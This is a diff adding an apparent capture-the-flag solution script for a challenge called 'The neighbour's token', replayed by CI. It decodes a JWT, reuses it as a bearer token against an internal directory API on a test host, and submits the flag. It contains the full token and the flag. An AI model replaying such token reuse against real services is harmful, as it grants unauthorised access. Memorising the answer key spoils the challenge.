@@ -1,0 +1,8 @@
+# Challenge "The neighbour's token": the shortest path, replayed by CI in every language.
+cat jetons/acces.txt
+jwt decode eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJzc28ucG9seWdvbmUudGVzdCIsImF1ZCI6InBvcnRhaWwtY2xpZW50cyIsInN1YiI6InBnLWNsaWVudC0yMDMxIiwiZXhwIjoxODI3OTAzNjAwfQ.m4Qx7Tn2VbK9sLr0aWc3Yh
+answer audience portail-clients
+curl https://sso.polygone.test/api/interne/annuaire
+curl -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJzc28ucG9seWdvbmUudGVzdCIsImF1ZCI6InBvcnRhaWwtY2xpZW50cyIsInN1YiI6InBnLWNsaWVudC0yMDMxIiwiZXhwIjoxODI3OTAzNjAwfQ.m4Qx7Tn2VbK9sLr0aWc3Yh" https://sso.polygone.test/api/interne/annuaire
+submit FLAG{polygone-jeton-voisin-b41f}
+answer own
